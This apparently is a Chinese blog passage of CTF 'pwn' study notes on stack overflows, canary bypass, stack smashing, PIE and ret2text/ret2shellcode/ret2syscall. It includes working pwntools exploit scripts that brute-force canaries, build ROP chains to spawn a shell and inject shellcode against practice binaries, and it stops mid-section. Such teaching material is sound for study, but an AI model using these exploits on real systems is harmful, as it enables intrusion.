<h3 id="要点"><a href="#要点" class="headerlink" title="要点"></a>要点</h3><p>函数调用栈中，eip 中存储的值完全是由栈中的返回地址决定的，栈溢出的原理就在于修改这个返回地址，使 eip 指向我们希望的位置，控制整个程序的执行流。</p>
<h3 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h3><p>向定长的缓冲区中写入了超长的数据，造成超出的数据覆写了合法的内存区域。</p>
<p>常见的有栈溢出、堆溢出、Data段溢出</p>
<h2 id="canary绕过"><a href="#canary绕过" class="headerlink" title="canary绕过"></a>canary绕过</h2><h3 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h3><p>一种用来防护栈溢出的保护机制，原理是在一个程序的入口处，先从fs（32）&#x2F;gs（64）寄存器中取出一个四字节（eax）或八字节（rax）的值存到栈上（缓冲区的后面），函数结束时会<u>检查这个栈上的值是否和存进去的值一致。（？）</u></p>
<p>canary 如果被篡改，会触发 __Stack_chk_fail函数并直接报错。</p>
<h3 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h3><h4 id="格式化字符串泄露canary"><a href="#格式化字符串泄露canary" class="headerlink" title="格式化字符串泄露canary"></a>格式化字符串泄露canary</h4><p>通过溢出将 canary 的最后一位改为 &#x2F;00，通过 printf 输出 canary。</p>
<h4 id="stack-smash"><a href="#stack-smash" class="headerlink" title="stack smash"></a>stack smash</h4><p>以一个程序为例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> a[<span class="number">0x10</span>];</span><br><span class="line">	read(<span class="number">0</span>,a,<span class="number">0x500</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	func();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译运行这个程序，简单溢出，会报出如下错误：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">giantbranch@ubuntu:~/Desktop/test$ ./test</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">*** stack smashing detected ***: ./test terminated</span><br><span class="line">Aborted (core dumped)</span><br></pre></td></tr></table></figure>

<p>用 gdb 调试：</p>
<img src="/2023/12/08/Pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/stack_smash.png" class="">

<p>当 canary 被篡改时会触发   __Stack_chk_fail。</p>
<p>查看__Stack_chk_fail 函数源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// debug/stack_chk_fail.c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> **__libc_argv attribute_hidden;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line">__attribute__ ((<span class="keyword">noreturn</span>))</span><br><span class="line">__stack_chk_fail (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用函数 __fortify_fail：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// debug/fortify_fail.c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> **__libc_argv attribute_hidden;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line">__attribute__ ((<span class="keyword">noreturn</span>)) internal_function</span><br><span class="line">__fortify_fail (<span class="type">const</span> <span class="type">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__fortify_fail)</span><br></pre></td></tr></table></figure>

<p>__fortify_fail 会负责打印出错误信息和文件名。</p>
<p>如果将 flag 地址覆盖到 libc_argv[0]，就可以利用 __fortify_fail 打印出 flag。</p>
<p>但是仅限于 libc-2.23 版本之前可以这么干，之后的版本就对 __fortify_fail 进行了修改。</p>
<p>如2.27：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__attribute__ ((<span class="keyword">noreturn</span>))</span><br><span class="line">__fortify_fail_abort (<span class="type">_Bool</span> need_backtrace, <span class="type">const</span> <span class="type">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  Don&#x27;t pass down</span></span><br><span class="line"><span class="comment">     __libc_argv[0] if we aren&#x27;t doing backtrace since __libc_argv[0]</span></span><br><span class="line"><span class="comment">     may point to the corrupted stack.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (need_backtrace ? (do_abort | do_backtrace) : do_abort,</span><br><span class="line">		    <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line">		    msg,</span><br><span class="line">		    (need_backtrace &amp;&amp; __libc_argv[<span class="number">0</span>] != <span class="literal">NULL</span></span><br><span class="line">		     ? __libc_argv[<span class="number">0</span>] : <span class="string">&quot;&lt;unknown&gt;&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>need_backtrace &amp;&amp; __libc_argv[0] 必须同时为空才能输出理想的内容。</p>
<p>如2.31：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__attribute__ ((<span class="keyword">noreturn</span>))</span><br><span class="line">__fortify_fail (<span class="type">const</span> <span class="type">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (do_abort, <span class="string">&quot;*** %s ***: terminated\n&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__fortify_fail)</span><br></pre></td></tr></table></figure>

<p>直接砍掉了第二个参数。</p>
<h5 id="例题：wdb2018-guess（网鼎杯2018）"><a href="#例题：wdb2018-guess（网鼎杯2018）" class="headerlink" title="例题：wdb2018_guess（网鼎杯2018）"></a>例题：wdb2018_guess（网鼎杯2018）</h5><p>64位，NX and Canary</p>
<img src="/2023/12/08/Pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/GUESS.png" class="">

<p>这个程序首先将 flag 读入 buf 缓冲区中，然后让用户猜测 flag 并输入，与 buf 进行比对。</p>
<p>猜是不可能猜的，所以可以尝试 stack smash 直接把 flag 泄露出来。</p>
<img src="/2023/12/08/Pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/GUESS_2.png" class="">

<p>sub_400A11() 处可以 fork。子进程中，循环终止，继续向下执行 gets()。父进程中，由于 if 中判断值为假，程序会不断地 wait，不断地 fork。直到 v6 等于 v7 等于 3，结束循环。一共有三次 fork 机会。</p>
<p>先泄露 libc。</p>
<h4 id="多进程下的爆破"><a href="#多进程下的爆破" class="headerlink" title="多进程下的爆破"></a>多进程下的爆破</h4><h5 id="pid-t-fork-void-函数"><a href="#pid-t-fork-void-函数" class="headerlink" title="pid_t fork(void) 函数"></a><strong>pid_t fork(void) 函数</strong></h5><p>创建一个新进程，操作系统会复制父进程的地址空间中的内容给子进程，调用 fork() 后，子进程与父进程的执行顺序是无法确定的。子进程无法通过 fork() 来创建子进程。</p>
<p>它有三个返回值：</p>
<ol>
<li>父进程中，fork 返回新创建子进程的 ID</li>
<li>子进程中，fork 返回 0</li>
<li>如果出现错误，fork 会返回一个负值</li>
</ol>
<p>如题：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">inits</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">	setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	system(<span class="string">&quot;/bin/sh\x00&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Input your name:&quot;</span>);</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">	read(<span class="number">0</span>,buf,<span class="number">0x60</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	inits();</span><br><span class="line">	<span class="type">pid_t</span> pid = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		pid = fork();</span><br><span class="line">		<span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(pid == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			func();</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;Good!&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			wait();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>canary 的第一位永远是 ‘\x00’，因此只需要爆破剩下七位即可。</p>
<p>exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./canary_fork&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./canary_fork&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your name:\n&quot;</span>)</span><br><span class="line">canary = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">backdoor_addr = <span class="number">0x40127d</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">		p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span> + canary + <span class="built_in">chr</span>(i))</span><br><span class="line">		a = p.recvuntil(<span class="string">&quot;Input your name:\n&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">b&#x27;Good!&#x27;</span> <span class="keyword">in</span> a:</span><br><span class="line">			canary += <span class="built_in">chr</span>(i)</span><br><span class="line">			<span class="built_in">print</span>(<span class="built_in">hex</span>(u64(canary.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))))</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(u64(canary)))</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span> + canary + <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span> + p64(backdoor_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h2><p>针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一种防御技术，当程序开启了 PIE 保护，在每次加载程序时都变换加载地址，从而不能通过 ROPgadget 等一些工具帮助解题。</p>
<p>开了 PIE 保护的程序，所有代码段的地址都只有最后三个数是已知的。程序的加载地址一般以内存页为单位，所以程序的基地址的最后三个数一定是 0，因此开了 PIE 后显示的后三位地址也就是实际地址的后三位。</p>
<h3 id="partial-writing"><a href="#partial-writing" class="headerlink" title="partial writing"></a>partial writing</h3><p>利用栈上已有的地址，只修改它们的最后两个字节（4个数字）。第四个数字通过爆破得到正确的结果。</p>
<p><strong>开了PIE之后 gdb 通过 <code>*$rebase(0xxxx)</code>下断点</strong></p>
<h3 id="泄露-PIE-基地址"><a href="#泄露-PIE-基地址" class="headerlink" title="泄露 PIE 基地址"></a>泄露 PIE 基地址</h3><h2 id="ret2xxx"><a href="#ret2xxx" class="headerlink" title="ret2xxx"></a>ret2xxx</h2><h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p>参考资料：<a target="_blank" rel="noopener" href="http://github.com/zhengmin1989/ROP_STEP_BY_STEP">http://github.com/zhengmin1989/ROP_STEP_BY_STEP</a></p>
<p>在栈缓冲区溢出的基础上，利用程序中已有的小片段（gadgets）来改变某些寄存器或变量的值，从而控制程序的执行流程。</p>
<p>gadgets 即以 ret 结尾的指令序列。</p>
<p>ROP 攻击一般需要满足以下条件：</p>
<ul>
<li>程序存在溢出，并且可以控制返回地址</li>
<li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址</li>
</ul>
<p>gadgets 的地址如果不固定，则需要想办法动态获取其地址。</p>
<h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>控制程序执行程序本身已有的代码（.text）</p>
<h4 id="例题1：jarvisoj-level2"><a href="#例题1：jarvisoj-level2" class="headerlink" title="例题1：jarvisoj_level2"></a>例题1：jarvisoj_level2</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;echo Input:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>read 存在溢出。有现成的 system 函数和 “&#x2F;bin&#x2F;sh” 字符串。</p>
<p>32 位的情况下，使用栈传递参数，可以画出正常调用时的栈图。</p>
<img src="/2023/12/08/Pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/level2%E6%A0%88%E5%9B%BE.png" class="">

<p>只需要控制返回地址为 system 函数地址并传入对应参数即可。</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#p = process(&quot;./level2&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27055</span>)</span><br><span class="line"></span><br><span class="line">sh_addr = <span class="number">0x0804A024</span></span><br><span class="line">sys_plt = <span class="number">0x08048320</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span> + p32(sys_plt) + p32(<span class="number">0</span>) + p32(sh_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recvuntil(b&quot;Input:\n&quot;)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="例题2：jarvisoj-level2-x64"><a href="#例题2：jarvisoj-level2-x64" class="headerlink" title="例题2：jarvisoj_level2_x64"></a>例题2：jarvisoj_level2_x64</h4><p>检查保护，只开了 NX。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;echo Input:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞和 32 位也是一样的。</p>
<p>主要是传参过程和 32 位有差异。32 位传参在栈上进行。64 位优先使用寄存器（依次为rdi，rsi，rdx，rcx，r8，r9），当参数超过六个时再使用栈。</p>
<p>那这题比较大的不同就是要把 “&#x2F;bin&#x2F;sh” 字符串的地址存在 rdi 中。</p>
<p>寻找 pop rdi;ret;</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">giantbranch@ubuntu:~/Desktop/buu/jarvisoj_level2_x64$ ROPgadget --binary level2_x64 --only &quot;pop|ret&quot;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x00000000004006ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006ae : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006b0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006b2 : pop r15 ; ret</span><br><span class="line">0x00000000004006ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006af : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400560 : pop rbp ; ret</span><br><span class="line">0x00000000004006b3 : pop rdi ; ret</span><br><span class="line">0x00000000004006b1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x00000000004006ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004004a1 : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 11</span><br></pre></td></tr></table></figure>

<p>找到目标 0x4006b3。</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment"># p = process(&quot;./level2_x64&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28991</span>)</span><br><span class="line"></span><br><span class="line">rdi_ret_addr = <span class="number">0x4006b3</span></span><br><span class="line">bin_sh_addr = <span class="number">0x600A90</span></span><br><span class="line">sys_plt_addr = <span class="number">0x4004C0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">128</span>+ <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span> + p64(rdi_ret_addr) + p64(bin_sh_addr) + p64(sys_plt_addr) </span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>控制程序执行 shellcode 代码，一般由我们自己去填充。</p>
<h4 id="例题1：jarvisoj-level1"><a href="#例题1：jarvisoj-level1" class="headerlink" title="例题1：jarvisoj_level1"></a>例题1：jarvisoj_level1</h4><p>检查保护，啥也没开。尤其是堆栈可执行。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What&#x27;s this:%p?\n&quot;</span>, buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>泄露 buf 的地址，在 buf 地址处写入 shellcode（使用pwntools自动生成），并把返回地址改为 buf 地址。</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">file_path = <span class="string">&#x27;./level1&#x27;</span></span><br><span class="line">context(binary = file_path,os = <span class="string">&#x27;linux&#x27;</span>,terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line">p = process(<span class="string">&quot;./level1&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;What&#x27;s this:&quot;</span>)</span><br><span class="line"><span class="comment"># 从进程的输出中接收接下来的10个字符，并将它们解释为十六进制数</span></span><br><span class="line">buf = <span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>) </span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment"># 在shellcode的右侧填充字符，直到达到指定的溢出长度</span></span><br><span class="line">payload = shellcode.ljust(<span class="number">0x88</span>+<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>)+p32(buf)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p>控制程序执行系统调用获取 shell。</p>
<h4 id="例题1：inndy-rop"><a href="#例题1：inndy-rop" class="headerlink" title="例题1：inndy_rop"></a>例题1：inndy_rop</h4><h5 id="方法一、自己实现系统调用"><a href="#方法一、自己实现系统调用" class="headerlink" title="方法一、自己实现系统调用"></a>方法一、自己实现系统调用</h5><p>32位，开了NX保护。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">overflow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">12</span>]; <span class="comment">// [esp+Ch] [ebp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">return</span> gets(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没有直接可用的后门函数，也没有现成的 &#x2F;bin&#x2F;sh 字符串，需要自己实现系统调用。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">giantbranch@ubuntu:~/Desktop/buu/inndy_rop$ file rop</span><br><span class="line">rop: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=e9ed96cd1a8ea3af86b7b73048c909236d570d9e, not stripped</span><br></pre></td></tr></table></figure>

<p>statically linked 意味着静态编译，因此程序一定存在 int 0x80，可以自己使用中断调用系统函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0</span>,bss+<span class="number">0x100</span>,<span class="number">8</span>) <span class="comment">//读入/bin/sh    设置eax为0x03</span></span><br><span class="line">execve(bss+<span class="number">0x100</span>,<span class="number">0</span>,<span class="number">0</span>) <span class="comment">//getshell    设置eax为0x0b</span></span><br></pre></td></tr></table></figure>

<p>用 ROPgadget 找到以下 gadgets:</p>
